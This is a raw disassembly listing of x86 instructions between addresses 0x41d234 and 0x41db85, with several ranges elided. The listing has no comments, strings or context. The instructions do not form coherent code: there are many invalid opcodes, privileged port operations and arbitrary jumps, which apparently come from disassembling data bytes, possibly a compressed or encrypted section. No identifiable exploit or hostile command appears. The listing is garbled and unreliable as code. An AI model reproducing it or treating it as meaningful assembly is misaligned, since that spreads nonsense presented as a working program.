  41d234:	lds    eax,FWORD PTR [eax+0x1a]
  41d237:	retf   
  41d238:	jbe    0x41d29b
  41d23a:	cmp    bh,BYTE PTR [edx+0x32]
  41d23d:	into   
  41d23e:	leave  
  41d23f:	add    al,0x72
  41d241:	test   BYTE PTR [edx],al
  41d243:	popf   
  41d244:	xchg   ebp,eax
  41d245:	outs   dx,DWORD PTR ds:[esi]
  41d246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d247:	sti    
  41d248:	mov    esp,0xfe393488
  41d24d:	jbe    0x41d2a6
  41d24f:	inc    esp
  41d250:	xchg   edi,eax
  41d251:	jnp    0x41d28b
  41d253:	call   0x4ac5a9c2
  41d258:	adc    edi,DWORD PTR ds:0x17255c69
  41d25e:	pop    edx
  41d25f:	mov    esi,ebp
  41d261:	stos   DWORD PTR es:[di],eax
  41d263:	pop    ebx
  41d264:	xor    ch,cl
  41d266:	lods   al,BYTE PTR ds:[esi]
  41d267:	repz fimul WORD PTR ds:0xc45aa04b
  41d26e:	dec    ebp
  41d26f:	mov    eax,ds:0x677ef8b1
  41d274:	jns    0x41d272
  41d276:	or     al,0x55
  41d278:	mov    cl,ch
  41d27a:	xor    BYTE PTR [edi+0x53],dh
  41d27d:	add    DWORD PTR [edx+eiz*1+0x74c96e9c],0xffffffd6
  41d285:	stc    
  41d286:	lods   al,BYTE PTR ds:[esi]
  41d287:	retf   0x655c
  41d28a:	es xchg ebx,eax
  41d28c:	stos   BYTE PTR es:[edi],al
  41d28d:	popa   
  41d28e:	jge    0x41d2bf
  41d290:	mov    edi,0xfc66e702
  41d295:	in     eax,0x40
  41d297:	push   es
  41d298:	int    0x73
  41d29a:	pop    eax
  41d29b:	loopne 0x41d2f6
  41d29d:	mov    al,ds:0xe717d711
  41d2a2:	inc    edi
  41d2a3:	add    eax,0x9ab4b452
  41d2a8:	jne    0x41d312
  41d2aa:	jo     0x41d316
  41d2ac:	cs out 0x6e,eax
  41d2af:	xor    eax,esi
  41d2b1:	in     eax,0x18
  41d2b3:	gs jecxz 0x41d2c0
  41d2b6:	and    eax,0x28d9f5f6
  41d2bb:	add    ch,BYTE PTR fs:[edx+esi*8-0x15]
  41d2c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2c1:	cwde   
  41d2c2:	or     BYTE PTR gs:[ebx*4-0x4ec1f238],0xc5
  41d2cb:	clc    
  41d2cc:	pop    esp
  41d2cd:	jno    0x41d2e4
  41d2cf:	sub    DWORD PTR [ebp+edx*8-0x3483a700],ebp
  41d2d6:	into   
  41d2d7:	sahf   
  41d2d8:	je     0x41d304
  41d2da:	in     eax,0xa2
  41d2dc:	leave  
  41d2dd:	test   BYTE PTR [eax+0x5c],ah
  41d2e0:	cs pusha 
  41d2e2:	sbb    ch,ch
  41d2e4:	mov    cl,0x3a
  41d2e6:	imul   eax,ecx,0x204705a4
  41d2ec:	xor    ah,al
  41d2ee:	clc    
  41d2ef:	retf   
  41d2f0:	or     eax,DWORD PTR [ebx-0x76]
  41d2f3:	cmp    edx,DWORD PTR [eax-0x4ac37060]
  41d2f9:	test   edx,eax
  41d2fb:	sahf   
  41d2fc:	adc    dl,BYTE PTR [edx-0x5615b7a2]
  41d302:	aad    0xc6
  41d304:	dec    edi
  41d305:	jg     0x41d2fd
  41d307:	pusha  
  41d308:	jns    0x41d2ad
  41d30a:	(bad)  
  41d30b:	ds imul edi,edi,0x473596
	...
  41d372:	add    BYTE PTR [eax],al
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	adc    eax,0xcbeff0dd
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0x42000001
  41d38d:	sub    DWORD PTR [ebp-0x53],ebx
  41d390:	push   ebp
  41d391:	and    al,0xce
  41d393:	cmc    
  41d394:	js     0x41d3c9
  41d396:	xchg   edx,eax
  41d397:	xor    esi,DWORD PTR [eax+0x683a579a]
  41d39d:	outs   dx,BYTE PTR ds:[esi]
  41d39e:	lods   eax,DWORD PTR ds:[esi]
  41d39f:	fsub   QWORD PTR [edi+0xd]
  41d3a2:	into   
  41d3a3:	ror    DWORD PTR [esi+0x71],1
  41d3a6:	mov    al,0x6c
  41d3a8:	jg     0x41d398
  41d3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3ab:	mov    ds:0x2c3be187,eax
  41d3b0:	cmc    
  41d3b1:	sub    bh,ah
  41d3b3:	sub    BYTE PTR [edx-0x64],dh
  41d3b6:	das    
  41d3b7:	jmp    DWORD PTR [edx+0x64]
  41d3ba:	push   eax
  41d3bb:	sbb    esi,edx
  41d3bd:	das    
  41d3be:	dec    ebp
  41d3bf:	jge    0x41d433
  41d3c1:	rol    DWORD PTR ds:0xa1a07a0f,cl
  41d3c7:	cdq    
  41d3c8:	or     al,0x68
  41d3ca:	inc    edi
  41d3cb:	out    0xcf,eax
  41d3cd:	lods   eax,DWORD PTR ds:[esi]
  41d3ce:	stos   DWORD PTR es:[edi],eax
  41d3cf:	dec    ecx
  41d3d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3d1:	(bad)  
  41d3d3:	sub    al,bl
  41d3d5:	jecxz  0x41d416
  41d3d7:	leave  
  41d3d8:	jns    0x41d378
  41d3da:	or     DWORD PTR [ebx],0xbd3a6076
  41d3e0:	sti    
  41d3e1:	push   esp
  41d3e2:	mov    eax,DWORD PTR gs:0x8b41715
  41d3e9:	dec    esi
  41d3ea:	mov    edi,0xe08fbb0f
  41d3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3f0:	push   eax
  41d3f1:	stos   BYTE PTR es:[edi],al
  41d3f2:	sub    dh,BYTE PTR [eax]
  41d3f4:	add    eax,0x55151014
  41d3f9:	push   esp
  41d3fa:	push   ebx
  41d3fb:	std    
  41d3fc:	push   ss
  41d3fd:	sbb    eax,0xad2a44bf
  41d402:	pushf  
  41d403:	pop    eax
  41d404:	xchg   esp,eax
  41d405:	inc    ecx
  41d406:	dec    ecx
  41d407:	nop
  41d408:	xor    eax,0x1370b812
  41d40d:	int    0x21
  41d40f:	and    eax,0xd8df76b5
  41d414:	jmp    0xc64635ae
  41d419:	push   ebx
  41d41a:	fcmovb st,st(6)
  41d41c:	adc    BYTE PTR [edx],al
  41d41e:	jo     0x41d496
  41d420:	sub    cl,BYTE PTR [edi]
  41d422:	data16 int3 
  41d424:	je     0x41d3d9
  41d426:	scas   al,BYTE PTR es:[edi]
  41d427:	out    0x90,eax
  41d429:	and    al,BYTE PTR [ebp+0x261d68aa]
  41d42f:	out    dx,eax
  41d430:	pop    ds
  41d431:	inc    esi
  41d432:	sub    eax,0xa0d0190d
  41d437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d438:	push   edx
  41d439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d43a:	test   al,0x49
  41d43c:	pop    ebx
  41d43d:	(bad)  
  41d43e:	imul   edi,DWORD PTR [edi+0x77876dc7],0xffffff97
  41d445:	push   es
  41d446:	stos   BYTE PTR es:[edi],al
  41d447:	dec    esi
  41d448:	jecxz  0x41d42b
  41d44a:	lods   eax,DWORD PTR ds:[esi]
  41d44b:	push   ebp
  41d44c:	test   DWORD PTR [esi-0x20b480e1],eax
  41d452:	in     eax,0x5a
  41d454:	pop    ss
  41d455:	mov    ebp,DWORD PTR [edi]
  41d457:	xchg   ecx,eax
  41d458:	mov    dl,0x1f
  41d45a:	cwde   
  41d45b:	xchg   esp,eax
  41d45c:	jae    0x41d469
  41d45e:	imul   esp,esi,0xb4758ea0
  41d464:	and    ah,ch
  41d466:	mov    dl,0x6e
  41d468:	push   ds
  41d469:	fdivrp st(2),st
  41d46b:	(bad)  
  41d46d:	pop    es
  41d46e:	ja     0x41d478
  41d470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d471:	(bad)  
  41d472:	lahf   
  41d473:	rcl    dh,cl
  41d475:	pop    eax
  41d476:	les    ebx,FWORD PTR [ebx-0x6ec6b6d9]
  41d47c:	pop    ebx
  41d47d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d47e:	jb     0x41d4f8
  41d480:	pop    dx
  41d482:	sbb    esi,ebx
  41d484:	into   
  41d485:	lods   al,BYTE PTR ds:[esi]
  41d486:	xor    al,BYTE PTR [esi]
  41d488:	inc    esp
  41d489:	jnp    0x41d4a3
  41d48b:	fs xchg edx,eax
  41d48d:	mov    BYTE PTR [ebx],dh
  41d48f:	add    cl,cl
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd0f9:0x80841889
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xe6000001
  41d50d:	jecxz  0x41d4c6
  41d50f:	push   edx
  41d510:	stc    
  41d511:	push   edi
  41d512:	mov    cl,0x67
  41d514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d515:	sahf   
  41d516:	push   cs
  41d517:	mov    eax,ds:0x2ae6b172
  41d51c:	add    ah,BYTE PTR [edx+0x25]
  41d51f:	retf   
  41d520:	dec    ecx
  41d521:	mov    ecx,DWORD PTR [ecx+0x747c245b]
  41d527:	cmp    al,0xdf
  41d529:	ret    
  41d52a:	sti    
  41d52b:	push   ecx
  41d52c:	and    al,0x82
  41d52e:	cmp    BYTE PTR [ebx-0x4e0db67c],al
  41d534:	xor    DWORD PTR [esi+0x1207b491],edx
  41d53a:	jecxz  0x41d545
  41d53c:	sbb    DWORD PTR [edx+0x1d],esi
  41d53f:	aam    0xa9
  41d541:	cdq    
  41d542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d543:	rol    DWORD PTR [edx+0x21],1
  41d546:	stos   BYTE PTR es:[edi],al
  41d547:	out    0x7b,eax
  41d549:	into   
  41d54a:	cli    
  41d54b:	or     BYTE PTR [edi+0x55104cb2],dh
  41d551:	cmp    bh,BYTE PTR [ebx+0x54e2d6f2]
  41d557:	stc    
  41d558:	cmp    al,0x8
  41d55a:	std    
  41d55b:	and    al,0x64
  41d55d:	pop    ebx
  41d55e:	out    0x7,eax
  41d560:	aam    0xcc
  41d562:	ins    BYTE PTR es:[edi],dx
  41d563:	cs lahf 
  41d565:	adc    BYTE PTR [edi+0x33fa7424],ah
  41d56b:	out    0x13,al
  41d56d:	sub    ch,BYTE PTR [esp+eiz*2]
  41d570:	inc    edi
  41d571:	ret    0xaee2
  41d574:	pop    esi
  41d575:	jb     0x41d5bd
  41d577:	sub    eax,0xb0d1b2e7
  41d57c:	adc    ebx,ebp
  41d57e:	mov    ebp,0x2525d6c6
  41d583:	enter  0xcbb0,0x30
  41d587:	jns    0x41d51b
  41d589:	and    edx,DWORD PTR [ecx]
  41d58b:	adc    al,0xa8
  41d58d:	or     DWORD PTR [esp+ebx*2],ebp
  41d590:	fistp  WORD PTR [esi]
  41d592:	add    al,0x44
  41d594:	push   ss
  41d595:	pop    ebp
  41d596:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41d598:	int3   
  41d599:	cmc    
  41d59a:	das    
  41d59b:	and    eax,0x33cc5cfe
  41d5a0:	sbb    al,0x93
  41d5a2:	push   ebp
  41d5a3:	xor    ebx,eax
  41d5a5:	and    eax,0xded2190d
  41d5aa:	xor    ebp,DWORD PTR [ebp-0x7b]
  41d5ad:	mov    ch,0xc6
  41d5af:	xchg   BYTE PTR [edx],dl
  41d5b1:	(bad)  
  41d5b2:	aad    0xb8
  41d5b4:	scas   eax,DWORD PTR es:[edi]
  41d5b5:	and    DWORD PTR [ebx],0xfdf45a92
  41d5bb:	pop    ebx
  41d5bc:	and    al,0x10
  41d5be:	dec    eax
  41d5bf:	inc    ebx
  41d5c0:	aaa    
  41d5c1:	mov    eax,0xcad84001
  41d5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c7:	fsubp  st(4),st
  41d5c9:	icebp  
  41d5ca:	ret    0x5f61
  41d5cd:	and    ebx,eax
  41d5cf:	mov    ecx,0x12ef71c0
  41d5d4:	retf   
  41d5d5:	ffreep st(5)
  41d5d7:	outs   dx,DWORD PTR ds:[esi]
  41d5d8:	cmp    eax,0xdbfccfc2
  41d5dd:	sahf   
  41d5de:	aas    
  41d5df:	jno    0x41d637
  41d5e1:	pop    eax
  41d5e2:	push   ebp
  41d5e3:	pop    ebp
  41d5e4:	cs loope 0x41d62d
  41d5e7:	pop    ebp
  41d5e8:	pop    ds
  41d5e9:	sbb    ebp,DWORD PTR [esi]
  41d5eb:	(bad)  
  41d5ec:	lods   eax,DWORD PTR ds:[esi]
  41d5ed:	jae    0x41d5c9
  41d5ef:	mov    dh,0x4e
  41d5f1:	xchg   ebx,eax
  41d5f2:	loope  0x41d64f
  41d5f4:	stos   BYTE PTR es:[edi],al
  41d5f5:	cmovge edi,ecx
  41d5f8:	xchg   esp,eax
  41d5f9:	xchg   eax,edx
  41d5fb:	repnz and eax,0x8f262379
  41d601:	cs pop esp
  41d603:	jl     0x41d648
  41d605:	lods   al,BYTE PTR ds:[esi]
  41d606:	leave  
  41d607:	lds    edi,FWORD PTR [eax]
  41d609:	in     al,0x7a
  41d60b:	imul   ecx,DWORD PTR [edx+0x6a277701],0x0
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x6c66e435
  41d681:	mov    ah,0x10
  41d683:	xchg   ebp,edx
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR ds:0x23000001,al
  41d68d:	mov    DWORD PTR [esp+ebp*2],eax
  41d690:	or     BYTE PTR [edi+0x78694b2a],cl
  41d696:	call   esi
  41d698:	push   esp
  41d699:	jo     0x41d691
  41d69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d69c:	inc    bl
  41d69e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d69f:	dec    esp
  41d6a0:	pushf  
  41d6a1:	cli    
  41d6a2:	(bad)  
  41d6a3:	clc    
  41d6a4:	inc    eax
  41d6a5:	call   0xc4718f5a
  41d6aa:	out    0x29,eax
  41d6ac:	sbb    eax,0xbfedbf26
  41d6b1:	xlat   BYTE PTR ds:[ebx]
  41d6b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b3:	inc    ecx
  41d6b4:	sub    dl,BYTE PTR [ecx-0x55]
  41d6b7:	(bad)  
  41d6b8:	das    
  41d6b9:	push   es
  41d6ba:	and    cl,BYTE PTR [edi-0x5e0b8074]
  41d6c0:	xlat   BYTE PTR ds:[ebx]
  41d6c1:	vdivpd ymm6,ymm6,YMMWORD PTR [eax+ecx*4+0x45fb5b87]
  41d6ca:	ins    BYTE PTR es:[edi],dx
  41d6cb:	jo     0x41d6c0
  41d6cd:	in     eax,0xc4
  41d6cf:	push   es
  41d6d0:	pop    edx
  41d6d1:	(bad)  
  41d6d2:	jge    0x41d74b
  41d6d4:	nop
  41d6d5:	cwde   
  41d6d6:	mov    ds:0xb2a14daf,eax
  41d6db:	xor    DWORD PTR [eax-0x74e1e73b],ebp
  41d6e1:	aas    
  41d6e2:	retf   0xd280
  41d6e5:	push   ebp
  41d6e6:	pop    edx
  41d6e7:	gs mov edi,0x692eac2e
  41d6ed:	cmp    BYTE PTR [esi],al
  41d6ef:	dec    ebp
  41d6f0:	cmp    al,0x33
  41d6f2:	push   0x810743fd
  41d6f7:	pop    ss
  41d6f8:	mov    dl,0x23
  41d6fa:	fwait
  41d6fb:	add    al,0xcf
  41d6fd:	push   esi
  41d6fe:	push   ds
  41d6ff:	(bad)  
  41d701:	xor    dl,BYTE PTR [ebp+edi*8-0x5c]
  41d705:	mov    dl,0x2c
  41d707:	and    ebp,ecx
  41d709:	cmc    
  41d70a:	xor    DWORD PTR [ebp+0x733362f4],eax
  41d710:	test   eax,0xb9880630
  41d715:	mov    esp,0x424edbbf
  41d71a:	mov    esi,0xd8c71ac6
  41d71f:	sub    eax,0x3eb30636
  41d724:	or     DWORD PTR [edi-0x783962bc],esi
  41d72a:	(bad)  
  41d72b:	(bad)  
  41d72c:	push   esi
  41d72d:	fst    DWORD PTR [edi-0x2df954fe]
  41d733:	scas   eax,DWORD PTR es:[edi]
  41d734:	xor    al,0xf2
  41d736:	xchg   ebp,eax
  41d737:	mov    eax,ds:0xd80b584f
  41d73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d73d:	js     0x41d6f5
  41d73f:	cmp    ecx,DWORD PTR [edi-0x1ad16a93]
  41d745:	push   ss
  41d746:	jge    0x41d7bc
  41d748:	xor    edx,esp
  41d74a:	pop    esi
  41d74b:	gs out dx,eax
  41d74d:	in     eax,dx
  41d74e:	push   ds
  41d74f:	sbb    dl,BYTE PTR [esi-0x4b]
  41d752:	outs   dx,DWORD PTR ds:[esi]
  41d753:	cs pop esi
  41d755:	xchg   esi,eax
  41d756:	ss pop esi
  41d758:	and    edx,DWORD PTR [edx+0x11]
  41d75b:	inc    ebx
  41d75c:	pop    ebx
  41d75d:	test   eax,0x3e999f23
  41d762:	pop    es
  41d763:	xchg   cl,al
  41d765:	jg     0x41d750
  41d767:	loopne 0x41d7ad
  41d769:	xchg   DWORD PTR [eax+0x24],esp
  41d76c:	adc    esp,DWORD PTR [edi+eiz*1]
  41d76f:	iret   
  41d770:	mov    ebp,0xc7ed85c0
  41d775:	je     0x41d723
  41d777:	aam    0xda
  41d779:	mov    ebp,0x8e994f03
  41d77e:	mov    ds:0xd4bb458d,al
  41d783:	jb     0x41d705
  41d785:	pop    es
  41d786:	pop    ecx
  41d787:	test   eax,0x440a95e4
  41d78c:	cld    
  41d78d:	fcmovb st,st(0)
  41d78f:	enter  0x61,0x0
	...
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	out    0xcc,eax
  41d802:	xlat   BYTE PTR ds:[ebx]
  41d803:	jno    0x41d7df
  41d805:	cmp    DWORD PTR [ecx],eax
  41d807:	add    BYTE PTR ds:0x39000001,al
  41d80d:	xlat   BYTE PTR ds:[ebx]
  41d80e:	mov    ebx,0xd3cd6219
  41d813:	outs   dx,BYTE PTR ds:[esi]
  41d814:	or     DWORD PTR [ebp-0x2e98d24b],ebx
  41d81a:	add    esp,DWORD PTR [ebx]
  41d81c:	les    ebp,FWORD PTR [ebx-0x7d]
  41d81f:	xor    BYTE PTR ds:0xaf532872,bl
  41d825:	call   0x39a1:0xf4be8e22
  41d82c:	xchg   esi,eax
  41d82d:	jmp    0x41d7d9
  41d82f:	dec    edi
  41d830:	das    
  41d831:	ins    BYTE PTR es:[edi],dx
  41d832:	sar    BYTE PTR [eax+ebp*1-0x690d00af],1
  41d839:	push   eax
  41d83a:	inc    ebx
  41d83b:	test   eax,0x7aa87554
  41d840:	jmp    0x41d82c
  41d842:	mov    ebp,0xad6b2b4e
  41d847:	jp     0x41d82c
  41d849:	fs pop ds
  41d84b:	adc    ebx,DWORD PTR [edx]
  41d84d:	je     0x41d8ac
  41d84f:	pop    eax
  41d850:	xor    DWORD PTR [esi-0x247288f4],ebp
  41d856:	retf   
  41d857:	sti    
  41d858:	imul   esp,eax,0x50
  41d85b:	mov    ecx,0x805b1c39
  41d860:	out    0xec,eax
  41d862:	fs aam 0x50
  41d865:	mov    ?,WORD PTR [eax+0x3e]
  41d868:	xchg   esp,eax
  41d869:	fdiv   DWORD PTR [eax+0x16]
  41d86c:	mov    ah,0x34
  41d86e:	add    BYTE PTR [ebp+0x72],ah
  41d871:	call   0x12819843
  41d876:	aad    0xec
  41d878:	fnstenv [eax]
  41d87a:	(bad)  
  41d87b:	push   esp
  41d87c:	sbb    ax,0xc322
  41d880:	dec    ecx
  41d881:	sete   BYTE PTR [ebx+0x61218144]
  41d888:	std    
  41d889:	mov    dh,0x5c
  41d88b:	sub    eax,0xbd0fa113
  41d890:	cld    
  41d891:	daa    
  41d892:	sub    eax,0xf28ab4e
  41d897:	(bad)  
  41d898:	jb     0x41d82e
  41d89a:	mov    edi,0x6e20a3f0
  41d89f:	test   eax,0xdcff1b3e
  41d8a4:	scas   eax,DWORD PTR es:[edi]
  41d8a5:	mov    ds:0xe47801a4,al
  41d8aa:	shl    al,0x23
  41d8ad:	rep outs dx,DWORD PTR ds:[esi]
  41d8af:	push   edi
  41d8b0:	xchg   DWORD PTR [esi+0x1c],ebx
  41d8b3:	frstor [edx+eax*1]
  41d8b6:	xchg   edi,eax
  41d8b7:	dec    eax
  41d8b8:	cld    
  41d8b9:	jno    0x41d8c5
  41d8bb:	aam    0x9a
  41d8bd:	dec    eax
  41d8be:	adc    DWORD PTR [edx+0x8cf89c6],ebx
  41d8c4:	push   0xffffffc1
  41d8c6:	xchg   ebp,eax
  41d8c7:	fdiv   QWORD PTR [ecx-0x2805e30d]
  41d8cd:	jnp    0x41d8cd
  41d8cf:	lahf   
  41d8d0:	jb     0x41d8bf
  41d8d2:	mov    al,0x1e
  41d8d4:	clc    
  41d8d5:	push   cs
  41d8d6:	sbb    al,0xbd
  41d8d8:	jg     0x41d89c
  41d8da:	jl     0x41d897
  41d8dc:	mov    cl,0xf4
  41d8de:	cdq    
  41d8df:	or     eax,0xa83ee232
  41d8e4:	stc    
  41d8e5:	call   0x9bd:0xd7930733
  41d8ec:	xchg   edx,eax
  41d8ed:	or     bl,BYTE PTR [esi-0x63]
  41d8f0:	push   esi
  41d8f1:	push   edx
  41d8f2:	retf   
  41d8f3:	push   ecx
  41d8f4:	arpl   WORD PTR [ebp-0x71],ax
  41d8f7:	cs mov bh,0x68
  41d8fa:	pop    ebp
  41d8fb:	sub    al,0x45
  41d8fd:	cwde   
  41d8fe:	pushf  
  41d8ff:	dec    eax
  41d900:	mov    edi,0x389757c6
  41d905:	hlt    
  41d906:	inc    esp
  41d907:	inc    ecx
  41d908:	inc    esi
  41d909:	mov    esp,0xaf6dc1fc
  41d90e:	fstp   TBYTE PTR [esp+ecx*2+0x0]
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs jmp 0x41d994
  41d982:	daa    
  41d983:	hlt    
  41d984:	fistp  QWORD PTR [edx]
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0x48000001
  41d98d:	shr    BYTE PTR [ecx+0x2ef46270],1
  41d993:	adc    dl,bl
  41d995:	xchg   ecx,eax
  41d996:	std    
  41d997:	mov    ecx,0x55b5dff1
  41d99c:	inc    eax
  41d99d:	cmc    
  41d99e:	jecxz  0x41d9b4
  41d9a0:	push   ss
  41d9a1:	pop    edx
  41d9a2:	scas   eax,DWORD PTR es:[edi]
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	jae    0x41d9d3
  41d9a6:	cli    
  41d9a7:	movsx  esp,BYTE PTR [edx]
  41d9aa:	out    0xac,eax
  41d9ac:	enter  0xa137,0x61
  41d9b0:	inc    esp
  41d9b1:	in     eax,0xc8
  41d9b3:	xchg   DWORD PTR [edx-0x5ee59a23],esp
  41d9b9:	jb     0x41d955
  41d9bb:	std    
  41d9bc:	ins    DWORD PTR es:[edi],dx
  41d9bd:	(bad)  
  41d9be:	mov    esp,0x22adcc35
  41d9c3:	cmc    
  41d9c4:	test   al,0x77
  41d9c6:	mov    fs,WORD PTR [esi-0x30653a4]
  41d9cc:	addr16 and eax,0x7e7dfb10
  41d9d2:	mov    esi,0xf2467c9a
  41d9d7:	push   ecx
  41d9d8:	(bad)  
  41d9d9:	xchg   ecx,eax
  41d9da:	inc    BYTE PTR [ebx]
  41d9dc:	or     eax,esi
  41d9de:	aas    
  41d9df:	clc    
  41d9e0:	mul    DWORD PTR [ebx+0x3077e142]
  41d9e6:	(bad)  
  41d9e7:	pop    edx
  41d9e8:	pop    ecx
  41d9e9:	in     al,0xda
  41d9eb:	and    BYTE PTR [ecx+0x47],0x86
  41d9ef:	sub    al,BYTE PTR [ebp-0x6c7aee5c]
  41d9f5:	shl    DWORD PTR [ebp+edx*2-0x14],cl
  41d9f9:	push   edx
  41d9fa:	pop    esi
  41d9fb:	adc    cl,cl
  41d9fd:	in     al,dx
  41d9fe:	cmp    eax,0xf88b6ab7
  41da03:	stc    
  41da04:	in     al,dx
  41da05:	xchg   ebp,eax
  41da06:	into   
  41da07:	mov    WORD PTR [eax-0x7683e04b],ss
  41da0d:	daa    
  41da0e:	push   0xffffffa1
  41da10:	xchg   BYTE PTR [ecx],dl
  41da12:	pop    ds
  41da13:	lds    edi,FWORD PTR [ebx+ebp*2]
  41da16:	lds    esi,FWORD PTR [ebx-0x4896713b]
  41da1c:	xlat   BYTE PTR ds:[ebx]
  41da1d:	imul   ecx,DWORD PTR [eax],0xffffff90
  41da20:	stc    
  41da21:	outs   dx,DWORD PTR ds:[esi]
  41da22:	test   DWORD PTR [eax],edx
  41da24:	into   
  41da25:	lahf   
  41da26:	fwait
  41da27:	lods   al,BYTE PTR ds:[esi]
  41da28:	in     eax,0xb1
  41da2a:	fdivr  QWORD PTR ss:[ecx-0x70]
  41da2e:	loope  0x41da7a
  41da30:	pusha  
  41da31:	pushf  
  41da32:	lods   eax,DWORD PTR ds:[esi]
  41da33:	mov    edi,0xbd32452b
  41da38:	std    
  41da39:	fsubr  QWORD PTR [ebx-0x78]
  41da3c:	pop    esp
  41da3d:	jmp    0x14f65d0d
  41da42:	cli    
  41da43:	lea    esi,ds:0x88daaaa5
  41da49:	scas   eax,DWORD PTR es:[edi]
  41da4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da4b:	test   al,0xbb
  41da4d:	ss dec ebx
  41da4f:	jb     0x41da74
  41da51:	inc    esi
  41da52:	sbb    ecx,eax
  41da54:	retf   
  41da55:	add    cl,BYTE PTR [edi+0x630420b8]
  41da5b:	sbb    edx,eax
  41da5d:	xchg   edx,eax
  41da5e:	push   0x1b2be575
  41da63:	inc    ecx
  41da64:	dec    edi
  41da65:	push   ebp
  41da66:	fldcw  WORD PTR [eax]
  41da68:	inc    esi
  41da69:	fwait
  41da6a:	inc    ecx
  41da6b:	cmc    
  41da6c:	(bad)  
  41da6d:	mov    ch,0x7c
  41da6f:	pop    ecx
  41da70:	in     al,0xbd
  41da72:	and    al,0x0
  41da74:	test   al,dh
  41da76:	jae    0x41da5f
  41da78:	mov    eax,0x4c67580a
  41da7d:	jp     0x41da8e
  41da7f:	lea    esp,[edx-0x3f2eb3b8]
  41da85:	retf   0xabf3
  41da88:	dec    edi
  41da89:	jecxz  0x41da93
  41da8b:	mov    bl,BYTE PTR [edi]
  41da8d:	adc    DWORD PTR [ebx],0x5
  41da90:	cmp    BYTE PTR [eax],al
	...
  41daf2:	add    BYTE PTR [eax],al
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffffef
  41db01:	ds inc eax
  41db03:	jg     0x41dae9
  41db05:	cmp    eax,DWORD PTR [ecx]
  41db07:	add    BYTE PTR ds:0x28000001,al
  41db0d:	fidivr WORD PTR [esp+edi*8-0x48]
  41db11:	fimul  WORD PTR [ecx+eax*4+0x5b]
  41db15:	pop    esp
  41db16:	dec    ebp
  41db17:	xchg   BYTE PTR es:[ebp-0xd],cl
  41db1b:	iret   
  41db1c:	frstor [edx+edi*2]
  41db1f:	test   edx,edi
  41db21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db22:	div    BYTE PTR [ebx-0x1e8a982]
  41db28:	pop    ebx
  41db29:	pop    ebx
  41db2a:	(bad)
  41db2d:	test   eax,0x4d084fc8
  41db32:	pop    esp
  41db33:	int    0x68
  41db35:	std    
  41db36:	loope  0x41dbad
  41db38:	jge    0x41dba6
  41db3a:	call   0x17e28492
  41db3f:	and    DWORD PTR [ecx+edx*1-0x52805f02],0xffffffe4
  41db47:	mov    ebx,0xbef45b68
  41db4c:	mov    al,0x51
  41db4e:	int3   
  41db4f:	add    ecx,edx
  41db51:	cmp    DWORD PTR [edi-0xfa9a9df],ebx
  41db57:	sbb    al,0xc5
  41db59:	in     eax,dx
  41db5a:	mov    eax,0x92325189
  41db5f:	ret    
  41db60:	sbb    DWORD PTR [eax+0x1ac1c91e],edi
  41db66:	gs push ecx
  41db68:	xor    DWORD PTR [edi],edi
  41db6a:	sub    al,0x83
  41db6c:	rol    DWORD PTR [edi],0x84
  41db6f:	xor    eax,0x1a81ea4a
  41db74:	fwait
  41db75:	ja     0x41dbee
  41db77:	out    0x64,eax
  41db79:	in     eax,0xd0
  41db7b:	mov    cl,0x21
  41db7d:	sub    esi,edx
  41db7f:	pop    edi
  41db80:	inc    edx
  41db81:	loop   0x41db46
  41db83:	and    ecx,DWORD PTR [eax]
  41db85:	loopne 0x41db51
